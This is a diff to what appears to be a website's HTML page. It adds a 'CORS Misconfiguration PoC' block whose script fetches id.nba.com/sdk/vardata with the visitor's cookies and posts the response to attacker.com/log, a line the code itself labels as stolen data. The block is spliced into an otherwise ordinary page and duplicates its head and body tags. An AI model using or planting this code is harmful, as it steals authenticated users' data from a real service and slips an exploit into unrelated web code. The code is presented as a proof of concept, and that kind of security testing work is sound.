@@ -18,6 +18,35 @@
     <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
     <link rel="manifest" href="assets/favicon/site.webmanifest">
 </head>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Misconfiguration PoC</title>
+</head>
+<body>
+    <h1>CORS Misconfiguration Exploit</h1>
+    <button onclick="exploit()">Exploit!</button>
+
+    <script>
+        function exploit() {
+            fetch("https://id.nba.com/sdk/vardata", {
+                method: "GET",
+                credentials: "include" // Send cookies with the request
+            })
+            .then(response => response.text()) // Read the response body
+            .then(data => {
+                // Send stolen data to the attacker's server
+                fetch("https://attacker.com/log", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ leakedData: data })
+                });
+                console.log("Leaked Data:", data); // Optional for debugging
+            })
+            .catch(err => console.error("Error:", err));
+        }
+    </script>
+</body>   
 <body>
     <header class="header" id="header">
         <nav class="nav container">
